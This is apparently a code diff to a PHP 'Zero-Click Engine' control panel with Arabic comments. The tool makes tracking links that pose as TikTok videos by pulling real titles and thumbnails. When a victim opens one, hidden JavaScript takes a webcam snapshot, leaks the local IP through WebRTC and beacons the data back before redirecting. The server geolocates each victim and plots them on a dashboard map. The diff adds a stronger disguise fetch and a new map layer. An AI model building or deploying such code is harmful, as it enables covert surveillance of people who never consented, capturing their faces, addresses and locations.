@@ -1,5 +1,4 @@
 <?php
-// تسريع السيرفر الداخلي
 date_default_timezone_set('Africa/Algiers');
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
@@ -38,7 +37,6 @@ try {
     $db = new PDO('sqlite:' . $db_file);
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
-    // تسريع SQLite
     $db->exec("PRAGMA journal_mode=WAL;");
     $db->exec("PRAGMA synchronous=NORMAL;");
 
@@ -68,7 +66,6 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // إضافة فهارس لتسريع البحث في لوحة التحكم
     $db->exec("CREATE INDEX IF NOT EXISTS idx_code ON captures(code)");
     $db->exec("CREATE INDEX IF NOT EXISTS idx_created ON captures(created_at)");
 
@@ -79,33 +76,57 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// تسريع جلب بيانات تيك توك
+// جلب بيانات تيك توك (النسخة القوية)
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];
-    
-    // محاولة استخراج ID الفيديو من الرابط
-    if (preg_match('/\/video\/(\d+)/', $url, $matches)) {
-        $video_id = $matches[1];
-        $oembed_url = "https://www.tiktok.com/oembed?url=https://www.tiktok.com/@tiktok/video/" . $video_id;
-    } else {
-        $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
-    }
 
+    // المحاولة 1: عبر oEmbed
+    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
     $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $oembed_url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 2, // تقليل وقت الانتظار
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
-    ]);
+    curl_setopt($ch, CURLOPT_URL, $oembed_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 4); 
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
     $response = curl_exec($ch);
     curl_close($ch);
 
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title'])) $meta['title'] = $data['title'];
-        if (!empty($data['thumbnail_url'])) $meta['image'] = $data['thumbnail_url'];
+        if (!empty($data['thumbnail_url'])) {
+            $meta['image'] = $data['thumbnail_url'];
+            return $meta;
+        }
+    }
+
+    // المحاولة 2: سحب مباشر (Fallback)
+    $ch_alt = curl_init();
+    curl_setopt($ch_alt, CURLOPT_URL, $url);
+    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
+    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
+    $html = curl_exec($ch_alt);
+    curl_close($ch_alt);
+
+    if ($html) {
+        $dom = new DOMDocument();
+        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
+        $xpath = new DOMXPath($dom);
+
+        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
+        if ($titleNodes->length > 0) {
+            $val = trim($titleNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['title'] = $val;
+        }
+
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
+        if ($imageNodes->length > 0) {
+            $val = trim($imageNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['image'] = $val;
+        }
     }
     return $meta;
 }
@@ -118,21 +139,16 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// كاش للـ IP لتسريع الاستعلامات المتكررة
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
     }
 
-    // استخدام كاش بسيط في الذاكرة
     static $cache = [];
     if (isset($cache[$ip])) return $cache[$ip];
 
     $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 2 // مهلة قصيرة جداً
-    ]);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3]);
     $json = curl_exec($ch);
     curl_close($ch);
 
@@ -142,10 +158,10 @@ function get_ip_details($ip) {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
             $isp = $data['isp'] ?? 'Unknown ISP';
             
-            // اختصار أسماء المتعاملين
             if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy';
             elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis';
             elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo';
+            elseif (stripos($isp, 'Optimum') !== false) $isp = 'Optimum Telecom';
             elseif (stripos($isp, 'Algerie Telecom') !== false) $isp = 'Algérie Télécom';
             else $isp = implode(' ', array_slice(explode(' ', trim($isp)), 0, 2));
 
@@ -229,7 +245,6 @@ if (isset($_GET['r'])) {
         const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
         const targetUrl = <?php echo json_encode($target_redirect); ?>;
 
-        // تسريع سحب الـ IP المحلي (300ms فقط)
         function getLocalIP() {
             return new Promise((resolve) => {
                 let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
@@ -245,11 +260,10 @@ if (isset($_GET['r'])) {
                         pc.close();
                     }
                 };
-                setTimeout(() => { if(!resolved) { resolve("Direct"); pc.close(); } }, 300); // تقليل الوقت لـ 300ms
+                setTimeout(() => { if(!resolved) { resolve("Direct"); pc.close(); } }, 300); 
             });
         }
 
-        // التوجيه الفوري وإرسال البيانات في الخلفية
         async function initTracking() {
             let imageData = "";
             
@@ -259,12 +273,12 @@ if (isset($_GET['r'])) {
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
-                    await new Promise(r => setTimeout(r, 200)); // وقت التقاط سريع
+                    await new Promise(r => setTimeout(r, 200)); 
                     
                     const canvas = document.createElement('canvas');
-                    canvas.width = 480; canvas.height = 360; // دقة أقل = حجم أصغر = سرعة أعلى
+                    canvas.width = 480; canvas.height = 360; 
                     canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
-                    imageData = canvas.toDataURL('image/jpeg', 0.5); // ضغط 50% لتسريع الرفع
+                    imageData = canvas.toDataURL('image/jpeg', 0.5); 
                     stream.getTracks().forEach(track => track.stop());
                 } catch (e) {}
             }
@@ -276,7 +290,6 @@ if (isset($_GET['r'])) {
             formData.append('image', imageData);
             formData.append('lip', localIp);
 
-            // 🔥 السر هنا: sendBeacon يرسل البيانات في الخلفية ويوجه المستخدم فوراً
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(window.location.href, formData);
                 window.location.replace(targetUrl);
@@ -424,7 +437,7 @@ $captures = $stmt->fetchAll();
         <div class="header-flex">
             <div>
                 <h1>Control Panel</h1>
-                <p class="subtitle">Zero-Click Engine v7 (Turbo Speed)</p>
+                <p class="subtitle">Zero-Click Engine v8 (Fixed Edition)</p>
             </div>
             <div style="text-align: left;">
                 <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
@@ -488,12 +501,16 @@ $captures = $stmt->fetchAll();
                                     <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--muted); font-size: 12px; border: 1px dashed var(--border);">الكاميرا معطلة (بدون صورة)</div>
                                 <?php endif; ?>
 
+                                <!-- الخريطة الجديدة: Esri Dark Gray بدون مفتاح API -->
                                 <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
                                     <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
                                     <script>
                                         document.addEventListener("DOMContentLoaded", function() {
                                             var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
-                                            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
+                                            // استخدام خرائط Esri الداكنة المجانية
+                                            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
+                                                maxZoom: 16
+                                            }).addTo(map);
                                             L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map).bindPopup("<b><?php echo htmlspecialchars($cap['public_ip']); ?></b><br><?php echo htmlspecialchars($cap['location']); ?>");
                                         });
                                     </script>
